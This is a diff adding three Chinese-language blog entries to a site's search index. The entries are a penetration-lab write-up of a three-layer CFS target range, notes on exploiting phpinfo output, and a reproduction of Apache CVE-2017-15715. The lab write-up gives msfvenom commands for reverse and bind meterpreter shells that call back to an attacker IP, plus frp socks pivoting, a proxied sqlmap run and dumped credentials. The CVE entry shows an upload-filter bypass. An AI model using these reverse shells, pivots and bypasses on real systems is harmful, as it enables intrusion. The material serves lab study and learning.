@@ -72,6 +72,71 @@
     </entry>
     
     
+    
+    <entry>
+      <title>cfs三层靶机挨打记录</title>
+      <link href="/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/"/>
+      <url>/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/</url>
+      
+        <content type="html"><![CDATA[<p>CFS</p><span id="more"></span><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210918183255816.png" alt="image-20210918183255816"></p><p>打开环境  thinkphp5 怼脸上了 这个版本洞洞很多  直接搜</p><p>找到个奇妙的 一键exp小工具</p><p>咔咔拿下第一台</p><p>查看 网卡  ifconfig</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913170027183.png" alt="image-20210913170027183"></p><p> 直接访问不了  没思路了   </p><p>被暴打 以后 giegie  说  流量转发 到外边来 </p><p>可以将靶机上线到msf</p><p>uname -a获取目标机信息</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913171028652.png" alt="image-20210913171028652"></p><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.203.87.148 lport=9091 -f elf &gt; dmhz.elf</span><br></pre></td></tr></table></figure><p>生成后上传到靶机1 修改权限777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set payload linux/x64/meterpreter_reverse_tcp</span><br><span class="line">show options</span><br><span class="line">use milti/handler</span><br><span class="line">也可以  </span><br><span class="line">handler -p linux/x64/meterpreter_reverse_tcp -H 10.203.87.148 -P 9091</span><br><span class="line"></span><br><span class="line">有关 msf的其他命令  </span><br><span class="line">在meterpreter下</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913173901521.png" alt="image-20210913173901521"></p><p>收到会话，成功拿到<code>meterperter</code>进入主机</p><p>用 <code>MSF</code> 中的这个命令获取当前的网段：</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913212439481.png" alt="image-20210913212439481"></p><p><code>meterpreter</code>中添加路由信息：<code>run autoroute -s 192.168.22.0/24</code></p><p>使用代理模块构建代理</p><p><code>vim /etc/proxychains4.conf</code>配置代理工具</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913191947615.png" alt="image-20210913191947615"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">route</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210917161014242.png" alt="image-20210917161014242"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p>对192.168.22.0/24段进行扫描</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210917160758243.png" alt="image-20210917160758243"></p><p>扫到   192.268.22.129这一堆</p><p>同时学习了 frp流量转发 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frp流量转发  </span><br><span class="line">攻击机 安装frp</span><br><span class="line">配置端口  </span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.203.87.148</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port =9091</span><br><span class="line">上传frpc  和frpc.ini文件到靶机  权限改为777</span><br><span class="line">靶机运行 ./frpc</span><br><span class="line">攻击机运行 ./frps -c frps.ini   </span><br></pre></td></tr></table></figure><p>流量转发成功。</p><p><img src="image-20210913214913042.png" alt="image-20210913214913042"></p><p><img src="image-20210913214628063.png" alt="image-20210913214628063"></p><p>是个八哥cms</p><p><img src="image-20210918183457411.png" alt="image-20210918183457411"></p><p>扫一下目录</p><p><img src="image-20210914111225355.png" alt="image-20210914111225355"></p><p>先查看 robots.txt</p><p><img src="image-20210914111327786.png" alt="image-20210914111327786"></p><p>捡到宝啦 </p><p><img src="image-20210915134225965.png" alt="image-20210915134225965"></p><p><img src="image-20210914112917498.png" alt="image-20210914112917498"></p><p>怀疑有sql  给 sqlmap配个socks代理哦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py --proxy socks5://10.203.87.148:1234 -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p keyword</span><br></pre></td></tr></table></figure><p><img src="image-20210914205706242.png" alt="image-20210914205706242"></p><p>跑出来；了  找找密码  随手dump数据库</p><p><img src="image-20210914205853366.png" alt="image-20210914205853366"></p><p>找到密码 登上去  米西米西  </p><p><code>admin/123qwe</code></p><p><img src="image-20210914205955876.png" alt="image-20210914205955876"></p><p>bagecms V3.1.3 存在  后台任意文件读取漏洞</p><p><img src="image-20210914212345124.png" alt="image-20210914212345124"></p><p>活捉   </p><p><img src="image-20210914214541122.png" alt="image-20210914214541122"></p><p>火速上车</p><p><code>ifconfig</code></p><p><img src="image-20210915134001181.png" alt="image-20210915134001181"></p><p>使用proxifiter将流量代理到10.203.87.119:1080端口使用工具，连接webshell。 下一台的情况和这台差不多，双网卡还存在一个33网段的ip，进行存活主机探测下一个 靶机  应该是通过192.168.33.0/24这块网卡继续  </p><p>使用<code>uname -a</code>查询靶机版本信息</p><p>msf生成一个  正向链接的 马    给 777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=54321 -f elf &gt; mbg.elf</span><br></pre></td></tr></table></figure><p>然后连接以后 </p><p>添加路由 </p><p>信息收集  </p><p>扫端口  </p><p>445  永恒之蓝，</p><p>靶机  跑了     。。。。。。。</p><p><strong>反思</strong></p><p>   1.对于各种  流程太不熟悉  做完一块以后   不知道  该干啥      </p><ol start="2"><li>msf不会用,   得学    下次 写总结  。</li><li>对于  网络拓补   相关知识 细节方面 不够了解   有时候知道</li><li></li></ol>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>phpinfo信息利用</title>
+      <link href="/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/"/>
+      <url>/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<p>phpinfo信息利用</p><span id="more"></span><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><h4 id="system-系统信息"><a href="#system-系统信息" class="headerlink" title="system:系统信息"></a>system:系统信息</h4><p><img src="image-20210728150900924.png" alt="image-20210728150900924"></p><h4 id="extension-dir-php扩展的路径"><a href="#extension-dir-php扩展的路径" class="headerlink" title="extension_dir:php扩展的路径"></a><strong>extension_dir:php扩展的路径</strong></h4><p><img src="image-20210728151221382.png" alt="image-20210728151221382"></p><h4 id="SERVER-‘HTTP-HOST’-网站真实IP"><a href="#SERVER-‘HTTP-HOST’-网站真实IP" class="headerlink" title="$_SERVER[‘HTTP_HOST’]:网站真实IP"></a>$_SERVER[‘HTTP_HOST’]:网站真实IP</h4><p><img src="image-20210728151415306.png" alt="image-20210728151415306"></p><h3 id="有关目录的"><a href="#有关目录的" class="headerlink" title="有关目录的"></a>有关目录的</h3><h4 id="SERVER-‘DOCUMENT-ROOT’-web根目录"><a href="#SERVER-‘DOCUMENT-ROOT’-web根目录" class="headerlink" title="$_SERVER[‘DOCUMENT_ROOT’]:web根目录"></a>$_SERVER[‘DOCUMENT_ROOT’]:web根目录</h4><p><img src="image-20210728151507429.png" alt="image-20210728151507429"></p><h4 id="SERVER-‘SCRIPT-FILENAME’-index-php根目录"><a href="#SERVER-‘SCRIPT-FILENAME’-index-php根目录" class="headerlink" title="**$_SERVER[‘SCRIPT_FILENAME’]**index.php根目录"></a>**$_SERVER[‘SCRIPT_FILENAME’]**index.php根目录</h4><p><img src="image-20210803151453564.png" alt="image-20210803151453564"></p><h4 id="SERVER-‘CONTEXT-DOCUMENT-ROOT’-前运行脚本所在的文档根目录"><a href="#SERVER-‘CONTEXT-DOCUMENT-ROOT’-前运行脚本所在的文档根目录" class="headerlink" title="**$_SERVER[‘CONTEXT_DOCUMENT_ROOT’]**前运行脚本所在的文档根目录"></a>**$_SERVER[‘CONTEXT_DOCUMENT_ROOT’]**前运行脚本所在的文档根目录</h4><p><img src="image-20210803151510199.png" alt="image-20210803151510199"></p><h4 id="session-save-path-session的存储路径"><a href="#session-save-path-session的存储路径" class="headerlink" title="session.save_path   session的存储路径"></a><strong>session.save_path</strong>   session的存储路径</h4><p><img src="image-20210803151800423.png" alt="image-20210803151800423"></p><h4 id="APACHE-RUN-DIR-和-APACHE-PID-FILE-APACHE的路径"><a href="#APACHE-RUN-DIR-和-APACHE-PID-FILE-APACHE的路径" class="headerlink" title="APACHE_RUN_DIR  和 APACHE_PID_FILE   APACHE的路径"></a><strong>APACHE_RUN_DIR</strong>  和 <strong>APACHE_PID_FILE</strong>   APACHE的路径</h4><p><img src="image-20210803152631954.png" alt="image-20210803152631954"></p><p><img src="image-20210803152913592.png" alt="image-20210803152913592"></p><p><img src="image-20210803152937985.png" alt="image-20210803152937985"></p><p><img src="image-20210803153211410.png" alt="image-20210803153211410"></p><h4 id="pdo-mysql-default-socket"><a href="#pdo-mysql-default-socket" class="headerlink" title="pdo_mysql.default_socket"></a><strong>pdo_mysql.default_socket</strong></h4><p><img src="image-20210803153014374.png" alt="image-20210803153014374"></p><h4 id="临时文件目录"><a href="#临时文件目录" class="headerlink" title="临时文件目录"></a>临时文件目录</h4><p><img src="image-20210728151841301.png" alt="image-20210728151841301"></p><p>phpinfo()页面post一个shell，可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了</p><h1 id="重要配置"><a href="#重要配置" class="headerlink" title="重要配置"></a>重要配置</h1><h4 id="allow-url-include-远程文件包含"><a href="#allow-url-include-远程文件包含" class="headerlink" title="allow_url_include:远程文件包含"></a>allow_url_include:远程文件包含</h4><p><img src="image-20210728152037075.png" alt="image-20210728152037075"></p><h4 id="disable-functions-表示禁用的函数"><a href="#disable-functions-表示禁用的函数" class="headerlink" title="disable_functions:表示禁用的函数"></a>disable_functions:表示禁用的函数</h4><p><img src="image-20210728152223602.png" alt="image-20210728152223602"></p><p>有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。</p><h4 id="asp-tags-php标签-php7以下版本有"><a href="#asp-tags-php标签-php7以下版本有" class="headerlink" title="asp_tags:php标签(php7以下版本有)"></a><strong>asp_tags:php标签</strong>(php7以下版本有)</h4><p><img src="image-20210728152325831.png" alt="image-20210728152325831"></p><p>有4种形式如果这个选项不开启的话(一般默认不开启)，使用asp的标签是不会解析的</p><p><img src="image-20210728152402171.png" alt="image-20210728152402171"></p><h4 id="short-open-tag"><a href="#short-open-tag" class="headerlink" title="short_open_tag"></a><strong>short_open_tag</strong></h4><p><img src="image-20210728152440576.png" alt="image-20210728152440576"></p><p>允许<??>这种形式，并且&lt;?=等价于&lt;? echo</p><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc:"></a>magic_quotes_gpc:</h4><p><img src="image-20210728153125839.png" alt="image-20210728153125839"></p><p>它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御</p><p>php5.4以下版本有的函数，默认开启，会对特殊字符进行转yi</p><blockquote><p>参考</p><p><a href="http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84</a></p></blockquote>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> php </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CVE-2017-15715漏洞复现</title>
+      <link href="/2021/07/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/"/>
+      <url>/2021/07/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<p><strong>Apache换行解析漏洞</strong></p><p><strong>影响版本</strong>：Apache 2.4.0~2.4.29</p><p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p><p><strong>环境说明</strong>：PHP5.5 、 Apache2.4.10</p><span id="more"></span><p>漏洞复现利用如下</p><p>打开环境即是个文件上传点</p><p><img src="image-20210723090110218.jpg" alt="image-20210723090110218"></p><p>先上潮汐看</p><p><img src="image-20210723090159097.jpg" alt="image-20210723090159097"></p><p>Apache</p><p>百度搜一波</p><p>我们利用CVE-2017-15715(Apache换行解析漏洞)</p><blockquote><p>此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照php 后缀进行解析，导致绕过一些服务器的安全策略。</p></blockquote><p>于是</p><p>上传一个php文件。注意，只能是<code>\x0A</code>，不能是<code>\x0D\x0A</code>，所以我们用hex功能在1.php后面添加一个<code>\x0A</code></p><p><img src="image-20210723090926609.jpg" alt="image-20210723090926609"></p><p>上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功</p><p>然后访问<code>/1.php%0A</code>，即可发现已经成功getshell</p><p><img src="image-20210723092640423.jpg" alt="image-20210723092640423"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> web安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
   
   
 </search>
